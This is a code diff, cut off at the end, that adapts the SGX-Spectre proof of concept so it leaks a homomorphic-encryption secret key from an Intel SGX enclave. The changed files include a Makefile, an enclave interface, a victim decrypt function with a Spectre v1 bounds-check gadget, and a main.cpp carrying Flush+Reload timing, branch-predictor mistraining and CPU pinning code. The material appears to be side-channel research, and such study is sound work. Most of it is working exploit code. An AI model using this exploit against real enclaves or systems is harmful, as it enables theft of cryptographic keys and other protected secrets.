diff -uprN orig/Makefile code/Makefile
--- orig/Makefile	2024-07-26 12:17:55.199327188 +0900
+++ code/Makefile	2024-07-26 12:42:18.539234048 +0900
@@ -5,10 +5,11 @@ CC=gcc
 CXX=g++
 CCASFLAGS=-g -O2 -Wall -Werror -std=gnu99 -fno-strict-aliasing -fno-strict-overflow -D_FORTIFY_SOURCE=2 -fstack-protector-all -DHAVE_GNU_STACK -Wno-implicit-function-declaration
 CFLAGS=-g -O2 -Wall -Werror -std=gnu99 -fno-strict-aliasing -fno-strict-overflow -D_FORTIFY_SOURCE=2 -fstack-protector-all -DHAVE_GNU_STACK -Wno-pointer-sign
-CXXFLAGS=-g -O2 -Wall -Werror -std=c++03 -fno-strict-aliasing -fno-strict-overflow -D_FORTIFY_SOURCE=2 -fstack-protector-all -DHAVE_GNU_STACK
+CXXFLAGS=-g -O2 -Wall -Werror -std=c++17 -fno-strict-aliasing -fno-strict-overflow -D_FORTIFY_SOURCE=2 -fstack-protector-all -DHAVE_GNU_STACK -pthread -fopenmp
 CPPFLAGS=-D_DEFAULT_SOURCE -D_BSD_SOURCE -D_POSIX_SOURCE -D_GNU_SOURCE -DNO_SYSLOG -DCOMPILE_WITH_INTEL_SGX 
 DEFS=
-INCLUDE=-I. 
+# PREFIX_FOR_SEAL=~/.local
+INCLUDE=-I. -I$(PREFIX_FOR_SEAL)/include/SEAL-4.1
 LDFLAGS=-Wl,-z,relro -Wl,-z,now
 
 
@@ -42,7 +43,8 @@ Signed_Enclave_Name := enclave.signed.so
 
 Enclave_Config_File := enclave/enclave.config.xml
 
-App_Link_Flags := $(SGX_COMMON_CFLAGS) -L$(SGX_LIBRARY_PATH) -l$(Urts_Library_Name) 
+# App_Link_Flags := $(SGX_COMMON_CFLAGS) -L$(SGX_LIBRARY_PATH) -l$(Urts_Library_Name) SEALライブラリのパスを追加
+App_Link_Flags := $(SGX_COMMON_CFLAGS) -L$(SGX_LIBRARY_PATH) -l$(Urts_Library_Name) -L$(PREFIX_FOR_SEAL)/lib -lseal-4.1
 
 ifeq ($(SGX_MODE), HW)
 	App_Link_Flags += -lsgx_uae_service
@@ -74,6 +76,10 @@ else
 	App_C_Flags += -DNDEBUG -UEDEBUG -UDEBUG
 endif
 
+utils.o: main/utils.cpp
+	$(CXX) $(CXXFLAGS) $(INCLUDE) -c $< -o main/$@ -lseal-4.1
+	@echo "CXX   <=  $<"
+
 enclave_u.c: $(SGX_EDGER8R) enclave/enclave.edl
 	cd main && $(SGX_EDGER8R) --untrusted ../enclave/enclave.edl --search-path ../enclave --search-path $(SGX_SDK)/include
 	@echo "GEN  =>  $@"
@@ -86,8 +92,8 @@ enclave_init.o: main/enclave_init.c
 	$(CC) $(App_C_Flags) -I$(SGX_SDK)/include -c $< -o main/$@
 	@echo "CC   <=  $<"
 
-main.o: enclave_u.o main/main.c
-	cd main && $(CC) -g -O2 -fPIC -DPIC -Werror $(App_C_Flags) -I$(SGX_SDK)/include -c main.c -o $@ 
+main.o: enclave_u.o main/main.cpp
+	cd main && $(CXX) -g -O2 -pthread -fPIC -DPIC $(App_C_Flags) -I$(SGX_SDK)/include -c main.cpp -o $@ 
 	@echo "CC   <=  $<"
 
 ##### Enclave Objects #####
@@ -98,12 +104,13 @@ Enclave_C_Flags := $(SGX_COMMON_CFLAGS)
 Enclave_Cpp_Flags := $(Enclave_C_Flags) -nostdinc -nostdinc++
 Enclave_Link_Flags := $(SGX_COMMON_CFLAGS) -Wl,--no-undefined -nostdlib -nodefaultlibs -nostartfiles -L$(SGX_LIBRARY_PATH) \
 	-Wl,--whole-archive -l$(Trts_Library_Name) -Wl,--no-whole-archive \
-	-Wl,--start-group -lsgx_tstdc -lsgx_tstdcxx -lsgx_tcmalloc -l$(Crypto_Library_Name) -l$(Service_Library_Name) -Wl,--end-group \
+	-Wl,--start-group -lsgx_tstdc -lsgx_tcxx -lsgx_tcmalloc -l$(Crypto_Library_Name) -l$(Service_Library_Name) -Wl,--end-group \
 	-Wl,-Bstatic -Wl,-Bsymbolic -Wl,--no-undefined \
 	-Wl,-pie,-eenclave_entry -Wl,--export-dynamic  \
 	-Wl,--defsym,__ImageBase=0 \
 	-Wl,--version-script=enclave/enclave.lds
 
+
 enclave_t.c: $(SGX_EDGER8R) enclave/enclave.edl
 	cd enclave && $(SGX_EDGER8R) --trusted ./enclave.edl --search-path . --search-path $(SGX_SDK)/include
 	@echo "GEN  =>  $@"
@@ -128,8 +135,12 @@ signed_enclave: enclave
 
 #################################
 
-sgxspectre: main.o enclave_u.o enclave_init.o 
-	$(CC) $(CFLAGS) -o $@ main/main.o main/enclave_u.o main/enclave_init.o $(App_Link_Flags) -lpthread
+sgxspectre: main.o enclave_u.o enclave_init.o utils.o
+	$(CXX) $(CXXFLAGS) -o $@ main/main.o main/enclave_u.o main/enclave_init.o main/utils.o $(App_Link_Flags)  -lpthread -lseal-4.1
+#$(CXX) $(CXXFLAGS) -o $@ main/main.o main/enclave_u.o main/enclave_init.o $(App_Link_Flags) -lpthread
+
+util: utils.o
+	$(CXX) $(CXXFLAGS) -o $@ main/utils.o $(App_Link_Flags) -lpthread -lseal-4.1
 
 clean:
 	find . -iname "enclave_u.?" -delete
diff -uprN orig/Makefile~ code/Makefile~
--- orig/Makefile~	1970-01-01 09:00:00.000000000 +0900
+++ code/Makefile~	2024-07-26 12:41:41.386890076 +0900
@@ -0,0 +1,153 @@
+# This Makefile is a modified version of the Intel SGX SDK SampleCode Makefile
+
+top_srcdir=..
+CC=gcc
+CXX=g++
+CCASFLAGS=-g -O2 -Wall -Werror -std=gnu99 -fno-strict-aliasing -fno-strict-overflow -D_FORTIFY_SOURCE=2 -fstack-protector-all -DHAVE_GNU_STACK -Wno-implicit-function-declaration
+CFLAGS=-g -O2 -Wall -Werror -std=gnu99 -fno-strict-aliasing -fno-strict-overflow -D_FORTIFY_SOURCE=2 -fstack-protector-all -DHAVE_GNU_STACK -Wno-pointer-sign
+CXXFLAGS=-g -O2 -Wall -Werror -std=c++17 -fno-strict-aliasing -fno-strict-overflow -D_FORTIFY_SOURCE=2 -fstack-protector-all -DHAVE_GNU_STACK -pthread -fopenmp
+CPPFLAGS=-D_DEFAULT_SOURCE -D_BSD_SOURCE -D_POSIX_SOURCE -D_GNU_SOURCE -DNO_SYSLOG -DCOMPILE_WITH_INTEL_SGX 
+DEFS=
+PREFIX_FOR_SEAL=~/.local
+INCLUDE=-I. -I$(PREFIX_FOR_SEAL)/include/SEAL-4.1 #自分の環境に合わせて変更
+LDFLAGS=-Wl,-z,relro -Wl,-z,now
+
+
+########## Intel SGX ############
+
+##### Parameters #####
+
+SGX_SDK ?= /opt/intel/sgxsdk
+SGX_MODE ?= HW
+SGX_PRERELEASE ?= 1
+SGX_COMMON_CFLAGS := -m64
+SGX_LIBRARY_PATH := $(SGX_SDK)/lib64
+SGX_ENCLAVE_SIGNER := $(SGX_SDK)/bin/x64/sgx_sign
+SGX_EDGER8R := $(SGX_SDK)/bin/x64/sgx_edger8r
+
+SGX_COMMON_CFLAGS += -g -O2
+
+ifeq ($(SGX_MODE), HW)
+	Urts_Library_Name := sgx_urts
+	Trts_Library_Name := sgx_trts
+	Service_Library_Name := sgx_tservice
+else
+	Urts_Library_Name := sgx_urts_sim
+	Trts_Library_Name := sgx_trts_sim
+	Service_Library_Name := sgx_tservice_sim
+endif
+Crypto_Library_Name := sgx_tcrypto
+
+Enclave_Name := enclave.so
+Signed_Enclave_Name := enclave.signed.so
+
+Enclave_Config_File := enclave/enclave.config.xml
+
+# App_Link_Flags := $(SGX_COMMON_CFLAGS) -L$(SGX_LIBRARY_PATH) -l$(Urts_Library_Name) SEALライブラリのパスを追加
+App_Link_Flags := $(SGX_COMMON_CFLAGS) -L$(SGX_LIBRARY_PATH) -l$(Urts_Library_Name) -L$(PREFIX_FOR_SEAL)/lib -lseal-4.1
+
+ifeq ($(SGX_MODE), HW)
+	App_Link_Flags += -lsgx_uae_service
+else
+	App_Link_Flags += -lsgx_uae_service_sim
+endif
+
+#################################
+
+
+all: sgxspectre signed_enclave
+
+
+########## Intel SGX ############
+
+##### App Objects #####
+
+App_C_Flags := $(SGX_COMMON_CFLAGS) -fPIC -Wno-attributes -Wno-implicit-function-declaration 
+
+# Three configuration modes - Debug, prerelease, release
+#   Debug - Macro DEBUG enabled.
+#   Prerelease - Macro NDEBUG and EDEBUG enabled.
+#   Release - Macro NDEBUG enabled.
+ifeq ($(SGX_DEBUG), 1)
+	App_C_Flags += -DDEBUG -UNDEBUG -UEDEBUG
+else ifeq ($(SGX_PRERELEASE), 1)
+	App_C_Flags += -DNDEBUG -DEDEBUG -UDEBUG
+else
+	App_C_Flags += -DNDEBUG -UEDEBUG -UDEBUG
+endif
+
+utils.o: main/utils.cpp
+	$(CXX) $(CXXFLAGS) $(INCLUDE) -c $< -o main/$@ -lseal-4.1
+	@echo "CXX   <=  $<"
+
+enclave_u.c: $(SGX_EDGER8R) enclave/enclave.edl
+	cd main && $(SGX_EDGER8R) --untrusted ../enclave/enclave.edl --search-path ../enclave --search-path $(SGX_SDK)/include
+	@echo "GEN  =>  $@"
+
+enclave_u.o: enclave_u.c
+	cd main && $(CC) $(App_C_Flags) -I$(SGX_SDK)/include -c $< -o $@
+	@echo "CC   <=  $<"
+
+enclave_init.o: main/enclave_init.c 
+	$(CC) $(App_C_Flags) -I$(SGX_SDK)/include -c $< -o main/$@
+	@echo "CC   <=  $<"
+
+main.o: enclave_u.o main/main.cpp
+	cd main && $(CXX) -g -O2 -pthread -fPIC -DPIC $(App_C_Flags) -I$(SGX_SDK)/include -c main.cpp -o $@ 
+	@echo "CC   <=  $<"
+
+##### Enclave Objects #####
+
+Enclave_Include_Paths := -Ienclave -I$(SGX_SDK)/include -I$(SGX_SDK)/include/tlibc -I$(SGX_SDK)/include/stlport
+
+Enclave_C_Flags := $(SGX_COMMON_CFLAGS) -nostdinc -fvisibility=hidden -fpie -fstack-protector $(Enclave_Include_Paths)
+Enclave_Cpp_Flags := $(Enclave_C_Flags) -nostdinc -nostdinc++
+Enclave_Link_Flags := $(SGX_COMMON_CFLAGS) -Wl,--no-undefined -nostdlib -nodefaultlibs -nostartfiles -L$(SGX_LIBRARY_PATH) \
+	-Wl,--whole-archive -l$(Trts_Library_Name) -Wl,--no-whole-archive \
+	-Wl,--start-group -lsgx_tstdc -lsgx_tcxx -lsgx_tcmalloc -l$(Crypto_Library_Name) -l$(Service_Library_Name) -Wl,--end-group \
+	-Wl,-Bstatic -Wl,-Bsymbolic -Wl,--no-undefined \
+	-Wl,-pie,-eenclave_entry -Wl,--export-dynamic  \
+	-Wl,--defsym,__ImageBase=0 \
+	-Wl,--version-script=enclave/enclave.lds
+
+
+enclave_t.c: $(SGX_EDGER8R) enclave/enclave.edl
+	cd enclave && $(SGX_EDGER8R) --trusted ./enclave.edl --search-path . --search-path $(SGX_SDK)/include
+	@echo "GEN  =>  $@"
+
+enclave_t.o: enclave_t.c
+	cd enclave && $(CC) $(Enclave_C_Flags) -c $< -o $@
+	@echo "CC   <=  $<"
+
+#################################
+
+enclave_attack.o: enclave/enclave_attack.c enclave_t.c
+	$(CC) $(CFLAGS) $(Enclave_C_Flags) -I$(SGX_SDK)/include -fPIC -DPIC -c -o enclave/$@ $<
+	@echo "CC  <=  $<"
+
+enclave: enclave_t.o  enclave_attack.o
+	$(CC) enclave/enclave_t.o enclave/enclave_attack.o -o $(Enclave_Name) $(Enclave_Link_Flags)
+	@echo "LINK =>  $(Enclave_Name)"
+
+signed_enclave: enclave
+	$(SGX_ENCLAVE_SIGNER) sign -key enclave/enclave_private.pem -enclave $(Enclave_Name) -out $(Signed_Enclave_Name) -config $(Enclave_Config_File)
+	@echo "SIGN =>  $(Signed_Enclave_Name)"
+
+#################################
+
+sgxspectre: main.o enclave_u.o enclave_init.o utils.o
+	$(CXX) $(CXXFLAGS) -o $@ main/main.o main/enclave_u.o main/enclave_init.o main/utils.o $(App_Link_Flags)  -lpthread -lseal-4.1
+#$(CXX) $(CXXFLAGS) -o $@ main/main.o main/enclave_u.o main/enclave_init.o $(App_Link_Flags) -lpthread
+
+util: utils.o
+	$(CXX) $(CXXFLAGS) -o $@ main/utils.o $(App_Link_Flags) -lpthread -lseal-4.1
+
+clean:
+	find . -iname "enclave_u.?" -delete
+	find . -iname "enclave_t.?" -delete
+	find . -iname "$(Enclave_Name)" -delete
+	find . -iname "$(Signed_Enclave_Name)" -delete
+	find . -iname "*\.o" -delete
+	find . -iname "*\.i" -delete
+	find . -iname "*~" -delete
+	rm sgxspectre -f
diff -uprN orig/clean.sh code/clean.sh
--- orig/clean.sh	1970-01-01 09:00:00.000000000 +0900
+++ code/clean.sh	2024-07-26 12:13:56.134276330 +0900
@@ -0,0 +1 @@
+rm results/*
diff -uprN orig/enclave/enclave.edl code/enclave/enclave.edl
--- orig/enclave/enclave.edl	2024-07-26 12:17:55.199327188 +0900
+++ code/enclave/enclave.edl	2024-07-26 12:13:56.130276328 +0900
@@ -19,6 +19,8 @@ enclave {
 	trusted {
 		public size_t ecall_get_offset(); 
 		public void ecall_victim_function(size_t x,[user_check] uint8_t * array2, [user_check] unsigned int * outside_array1_size); 
+		public void ecall_decrypt(size_t x,[user_check] uint64_t* c_0,[user_check] uint64_t *c_1,[user_check] uint64_t *plaintext,[user_check] uint8_t *array2,[user_check] unsigned int *outside_array1_size);
+		public void ecall_load_key([user_check] uint64_t* data);
 	};
 	
 	untrusted {
diff -uprN orig/enclave/enclave_attack.c code/enclave/enclave_attack.c
--- orig/enclave/enclave_attack.c	2024-07-26 12:17:55.199327188 +0900
+++ code/enclave/enclave_attack.c	2024-07-26 12:13:56.130276328 +0900
@@ -15,24 +15,39 @@
 
 #include "enclave_t.h"
 
+#define N 8192			//64KiB: 8192, 128KiB: 16384,	256KiB: 32768
+#define LEN 65536		//64KiB: 65536, 128KiB: 131072,	256KiB: 262144
+
 //unsigned int array1_size = 16;
 uint8_t unused1[64];
 uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
 uint8_t unused2[64];
 
 char *secret = "The Magic Words are Squeamish Ossifrage.";
-
+//double secretKey[] = {1.0,2.0,3.0,4.0,5.0,6.0,7.0,8.0,9.0,0.0,1.0,2.0,3.0,4.0,5.0,6.0,7.0,8.0,9.0,0.0,1.0,2.0,3.0,4.0,5.0,6.0,7.0,8.0,9.0,0.0,1.0,2.0,3.0,4.0,5.0,6.0,7.0,8.0,9.0,0.0};
+uint64_t secretKey[N];
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
 size_t ecall_get_offset() { 
-	temp = secret[0]; //Bring secrete into cache.
-	return (size_t)(secret-(char*)array1);
-} 
+	temp = secretKey[0]; //Bring secrete into cache.
+	return (size_t)((char*)secretKey-(char*)array1);
+}
+
+void ecall_load_key(uint64_t *data) {
+	for(int i = 0; i < N; i++) secretKey[i] = data[i];
+	// for(int i = 0; i < LEN; i++) secretKey[i] = i;
+}
 
 void ecall_victim_function(size_t x, uint8_t * array2, unsigned int * outside_array1_size) {
 	//if (x < array1_size) {
 	if (x < *outside_array1_size) {
-		 temp &= array2[array1[x] * 512];
-	 }
+		temp &= array2[array1[x] * 512];
+	}
 }
 
+void ecall_decrypt(size_t x, uint64_t* c_0, uint64_t *c_1, uint64_t  *plaintext, uint8_t * array2, unsigned int *outside_array1_size) {
+	if(x < *outside_array1_size) {
+		temp &= array2[array1[x] * 512];
+		plaintext[x] = c_0[x] + c_1[x]*secretKey[x];
+	}
+}
diff -uprN orig/main/enclave_init.h code/main/enclave_init.h
--- orig/main/enclave_init.h	2024-07-26 12:17:55.199327188 +0900
+++ code/main/enclave_init.h	2024-07-26 12:13:56.134276330 +0900
@@ -12,6 +12,9 @@
  * See the License for the specific language governing permissions and
  * limitations under the License.
  */
+#ifdef __cplusplus
+extern "C" {
+#endif
 
 #ifndef ENCLAVE_INIT_H_
 #define ENCLAVE_INIT_H_
@@ -20,3 +23,8 @@ void initialize_enclave(void);
 void destroy_enclave(void);
 
 #endif
+
+#ifdef __cplusplus
+}
+#endif
+
diff -uprN orig/main/main.c code/main/main.c
--- orig/main/main.c	2024-07-26 12:17:55.199327188 +0900
+++ code/main/main.c	1970-01-01 09:00:00.000000000 +0900
@@ -1,166 +0,0 @@
-/*
- * Copyright 2018 Imperial College London
- * Licensed under the Apache License, Version 2.0 (the "License");
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at   
- * 
- *      http://www.apache.org/licenses/LICENSE-2.0
- * 
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an "AS IS" BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied
- * See the License for the specific language governing permissions and
- * limitations under the License.
- */
-
-#include <stdio.h>
-#include <string.h>
-#include <assert.h>
-#include <stdlib.h>
-#include <stdint.h>
-#ifdef _MSC_VER
-#include <intrin.h> /* for rdtscp and clflush */
-#pragma optimize("gt",on)
-#else
-#include <x86intrin.h> /* for rdtscp and clflush */
-#endif
-
-#include "enclave_u.h"
-#include "enclave_init.h"
-
-extern sgx_enclave_id_t global_eid;
-
-unsigned int array1_size = 16;
-uint8_t unused1[64];
-uint8_t array1dupe[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
-uint8_t unused2[64];
-uint8_t array2[256 * 512];
-
-/********************************************************************
- Analysis code
-********************************************************************/
- #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
-
- /* Report best guess in value[0] and runner-up in value[1] */
- void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
-	static int results[256];
-	int tries, i, j, k, mix_i; 
-	unsigned int junk = 0;
-	size_t training_x, x;
-	register uint64_t time1, time2;
-	volatile uint8_t *addr;
-	
-	for (i = 0; i < 256; i++)
-		results[i] = 0;
-
-	for (tries = 999; tries > 0; tries--) {
-		/* Flush array2[256*(0..255)] from cache */
-		for (i = 0; i < 256; i++)
-		_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
-
-		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
-		training_x = tries % array1_size;
-		for (j = 29; j >= 0; j--) {
-			_mm_clflush(&array1_size);
-			volatile int z;
-			for (z = 0; z < 100; z++) {} /* Delay (can also mfence) */
-			
-			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
-			/* Avoid jumps in case those tip off the branch predictor */
-			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
-			x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
-			x = training_x ^ (x & (malicious_x ^ training_x));
-			
-			/* Call the victim! */ 
-  		        sgx_status_t ret = SGX_ERROR_UNEXPECTED;
-			ret = ecall_victim_function(global_eid, x, array2, &array1_size);
-    			if (ret != SGX_SUCCESS)
-        			abort();
-		}
-		
-		/* Time reads. Order is lightly mixed up to prevent stride prediction */
-		for (i = 0; i < 256; i++) {
-			mix_i = ((i * 167) + 13) & 255;
-			addr = &array2[mix_i * 512];
-			time1 = __rdtscp(&junk); /* READ TIMER */
-			junk = *addr; /* MEMORY ACCESS TO TIME */
-			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-			//if (time2 <= CACHE_HIT_THRESHOLD)
-			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1dupe[tries % array1_size])
-			{
-				results[mix_i]++; /* cache hit - add +1 to score for this value */
-			}
-		}
-		
-		/* Locate highest & second-highest results results tallies in j/k */
-		j = k = -1;
-		for (i = 0; i < 256; i++) {
-			if (j < 0 || results[i] >= results[j]) {
-				k = j;
-				j = i;
-			} else if (k < 0 || results[i] >= results[k]) {
-				k = i;
-			}
-		}
-
-		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
-			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
-		}
-
-	results[0] ^= junk; /* use junk so code above won’t get optimized out*/
-	value[0] = (uint8_t)j;
-	score[0] = results[j];
-	value[1] = (uint8_t)k;
-	score[1] = results[k];
- }
-
-
-int spectre_main(int argc, char **argv) {
-	size_t malicious_x; 
-	sgx_status_t ret  = ecall_get_offset(global_eid, &malicious_x); /* default for malicious_x */
-	if (ret != SGX_SUCCESS)
-        	abort();
-
-	
-	int i, score[2], len=40;
-	uint8_t value[2];
-	
-	for (i = 0; i < sizeof(array2); i++)
-		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
-
-	if (argc == 3) {
-		sscanf(argv[1], "%p", (void**)(&malicious_x));
-		malicious_x -= (size_t)array1dupe; /* Convert input value into a pointer */
-		sscanf(argv[2], "%d", &len);
-	}
-	
-	printf("Reading %d bytes:\n", len);
-	
-	while (--len >= 0) {
-		printf("Reading at malicious_x = %p... ", (void*)malicious_x);
-		readMemoryByte(malicious_x++, value, score);
-		printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
-		printf("0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-		if (score[1] > 0)
-			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
-		printf("\n");
-	}
-
-	return (0);
- }
-
-/* Application entry */
-int main(int argc, char *argv[])
-{
-    /* Initialize the enclave */
-    initialize_enclave();
- 
-    /* Call the main attack function*/
-    spectre_main(argc, argv); 
-
-    /* Destroy the enclave */
-	 destroy_enclave();
-
-    return 0;
-}
-
diff -uprN orig/main/main.cpp code/main/main.cpp
--- orig/main/main.cpp	1970-01-01 09:00:00.000000000 +0900
+++ code/main/main.cpp	2024-07-26 13:02:18.849977668 +0900
@@ -0,0 +1,349 @@
+/*
+ * Copyright 2018 Imperial College London
+ * Licensed under the Apache License, Version 2.0 (the "License");
+ * you may not use this file except in compliance with the License.
+ * You may obtain a copy of the License at   
+ * 
+ *      http://www.apache.org/licenses/LICENSE-2.0
+ * 
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+// #define _GNU_SOURCE
+#include "pthread.h"
+#include <errno.h>
+#include <signal.h>
+#include <sched.h>
+
+#pragma comment (lib, "pthreadVC2.lib")
+
+#include <stdio.h>
+#include <string.h>
+#include <assert.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <time.h>
+#include <iostream>
+#include <chrono>
+#ifdef _MSC_VER
+#include <intrin.h> /* for rdtscp and clflush */
+#pragma optimize("gt",on)
+#else
+#include <x86intrin.h> /* for rdtscp and clflush */
+#endif
+
+#include "enclave_u.h"
+#include "enclave_init.h"
+#include "utils.hpp"
+
+struct pp_arg_struct {
+	int junk;
+	int tries;
+	int *results;
+};
+
+struct pt_arg_struct {
+	size_t malicious_x; 
+	int tries;
+};
+
+using namespace std;
+
+extern sgx_enclave_id_t global_eid;
+
+unsigned int array1_size = 16;
+uint8_t unused1[64];
+uint8_t array1dupe[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
+uint8_t unused2[64];
+uint8_t array2[256 * 512];
+uint64_t secretKey[N];
+uint64_t ciphertext[2][N];
+uint64_t plaintext[N];
+
+uint8_t result[LEN+1];
+double exec_times[3][LEN];
+double read_byte[2];
+int finished_byte = 0;
+int ret = 0;
+int ten_s_cnt = 1;
+
+int learn_loop = 20;
+int global_tries = 100;
+
+/********************************************************************
+ Analysis code
+********************************************************************/
+////////////////////////////////////////////////////////////////////
+//		Flush+Reload
+////////////////////////////////////////////////////////////////////
+
+ #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
+
+ /* Report best guess in value[0] and runner-up in value[1] */
+void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], int len) {
+	static int results[256];
+	int tries, i, j, k, mix_i; 
+	unsigned int junk = 0;
+	size_t training_x, x;
+	register uint64_t time1, time2;
+	volatile uint8_t *addr;
+	struct timespec start_time, end_time;
+	double execution_time = 0;
+
+	for (i = 0; i < 256; i++)
+		results[i] = 0;
+
+	for (tries = global_tries; tries > 0; tries--) {
+		/* Flush array2[256*(0..255)] from cache */
+		for (i = 0; i < 256; i++)
+		_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
+
+#if MESURE_EACH
+		clock_gettime(CLOCK_MONOTONIC, &start_time);
+#endif
+		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
+		training_x = tries % array1_size;
+		for (j = learn_loop; j >= 0; j--) {
+			_mm_clflush(&array1_size);
+			volatile int z;
+			//for (z = 0; z < 100; z++) {} /* Delay (can also mfence) */
+			
+			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
+			/* Avoid jumps in case those tip off the branch predictor */
+			x = ((j % ACCESS_FREQ) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
+			x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
+			x = training_x ^ (x & (malicious_x ^ training_x));
+			
+			/* Call the victim! */ 
+			// SGX_ASSERT(ecall_victim_function(global_eid, x, array2, &array1_size));
+			SGX_ASSERT(ecall_decrypt(global_eid, x, ciphertext[0], ciphertext[1], plaintext, array2, &array1_size));
+		}
+#if MESURE_EACH
+		clock_gettime(CLOCK_MONOTONIC, &end_time);
+		execution_time = (end_time.tv_sec - start_time.tv_sec) + (end_time.tv_nsec - start_time.tv_nsec) / 1e9;
+		exec_times[0][LEN-len-1] = execution_time;
+#endif
+
+		
+		//clock_gettime(CLOCK_MONOTONIC, &start_time);
+		/* Time reads. Order is lightly mixed up to prevent stride prediction */
+		for (i = 0; i < 256; i++) {
+			mix_i = ((i * 167) + 13) & 255;
+			addr = &array2[mix_i * 512];
+			time1 = __rdtscp(&junk); /* READ TIMER */
+			junk = *addr; /* MEMORY ACCESS TO TIME */
+			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+			//if (time2 <= CACHE_HIT_THRESHOLD)
+			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1dupe[tries % array1_size])
+			{
+				results[mix_i]++; /* cache hit - add +1 to score for this value */
+			}
+		}
+#if MESURE_EACH
+		clock_gettime(CLOCK_MONOTONIC, &end_time);
+		execution_time = (end_time.tv_sec - start_time.tv_sec) + (end_time.tv_nsec - start_time.tv_nsec) / 1e9;
+		exec_times[1][LEN-len-1] = execution_time;
+#endif
+		
+
+#if MESURE_EACH
+		clock_gettime(CLOCK_MONOTONIC, &start_time);
+#endif
+		/* Locate highest & second-highest results results tallies in j/k */
+		j = k = -1;
+		for (i = 0; i < 256; i++) {
+			if (j < 0 || results[i] >= results[j]) {
+				k = j;
+				j = i;
+			} else if (k < 0 || results[i] >= results[k]) {
+				k = i;
+			}
+		}
+#if MESURE_EACH
+		clock_gettime(CLOCK_MONOTONIC, &end_time);
+		execution_time = (end_time.tv_sec - start_time.tv_sec) + (end_time.tv_nsec - start_time.tv_nsec) / 1e9;
+		exec_times[2][LEN-len-1] = execution_time;
+#endif
+
+		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
+			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+	}
+
+	results[0] ^= junk; /* use junk so code above won’t get optimized out*/
+	value[0] = (uint8_t)j;
+	score[0] = results[j];
+	value[1] = (uint8_t)k;
+	score[1] = results[k];
+}
+
+
+
+/////////////////////////////////////////////////////////////////////////
+// Spectre Main
+//////////////////////////////////////////////////////////////////////////
+
+int spectre_main(int argc, char **argv) {
+
+#if FIX_CPU_CORE	
+	//fix cpu core******************************************************
+    cpu_set_t cur_mask, new_mask;
+    size_t length = sizeof(cur_mask);
+    pid_t pid = getpid();
+ 
+    // 現在の設定値を取得・表示 
+    if (sched_getaffinity(0, length, &cur_mask)) {
+        perror("sched_getaffinity");
+        return -1;
+    }
+    printf("pid %d's old affinity: %08lx\n", pid, *(unsigned long*)cur_mask.__bits);
+ 
+    // mask を CPU1 のみに設定 
+    CPU_ZERO(&new_mask);
+    CPU_SET(1, &new_mask);
+ 
+    // mask 値を反映 
+    if (sched_setaffinity(0, length, &new_mask)) {
+        perror("sched_setaffinity");
+        return -1;
+    }
+	printf("pid %d's new affinity: %08lx\n", pid, *(unsigned long*)new_mask.__bits);
+	//*******************************************************************
+#endif
+
+	size_t malicious_x; 
+	SGX_ASSERT(ecall_get_offset(global_eid, &malicious_x)); /* default for malicious_x */
+	//malicious_x += N*8-1;
+
+	int i, score[2];
+	int len = LEN;
+	uint8_t value[2];
+	struct timespec start_time, end_time;
+	chrono::system_clock::time_point  start, end;
+	double execution_time = 0;
+	double total_execution_time = 0;
+	
+	for (i = 0; i < sizeof(array2); i++)
+		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
+
+	if (argc == 3) {
+		sscanf(argv[1], "%p", (void**)(&malicious_x));
+		malicious_x -= (size_t)array1dupe; /* Convert input value into a pointer */
+		sscanf(argv[2], "%d", &len);
+	}
+
+	printf("Reading %d bytes:\n", len);
+	while (--len >= 0) {
+		//printf("Reading at malicious_x = %p... ", (void*)malicious_x);
+		start = chrono::system_clock::now();
+		readMemoryByte(malicious_x++, value, score, len);	//++ OR --
+		end = chrono::system_clock::now();
+		result[LEN-len-1] = value[0];
+
+		execution_time = chrono::duration_cast<std::chrono::nanoseconds>(end-start).count() / 1000000000.00; //[s]
+		total_execution_time += execution_time;
+		exec_times[0][LEN-len-1] = execution_time;
+
+		if(len <= 0) {
+			printf("finished\n");
+			read_byte[0] = LEN-len;
+			read_byte[1] = total_execution_time;
